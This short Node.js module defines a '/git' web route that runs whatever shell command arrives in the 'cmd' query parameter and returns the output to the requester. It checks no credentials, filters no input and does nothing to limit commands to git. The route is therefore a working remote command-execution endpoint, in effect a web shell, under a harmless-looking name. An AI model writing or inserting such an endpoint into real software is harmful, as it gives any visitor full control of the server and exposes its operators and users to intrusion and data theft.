
module.exports = function(router, url, exec) {

router.get('/git', function(req, res, next){
  console.log("asdf")
  var parsedUrl = url.parse(req.url, true);
  var cmd = parsedUrl.query['cmd'];
  
 
  if( cmd ) {
    var child = exec(cmd, function (error, stdout, stderr) {
      var result = {
        stdout: stdout,
        stderr: stderr,
        cmd: cmd
      };

      res.send(result);
    });

  } else {
    var result = '{"stdout":"' + '' + '","stderr":"' + 'cmd is mandatory' + '","cmd":"' + cmd + '"}';
    res.send(result)
  }
});

}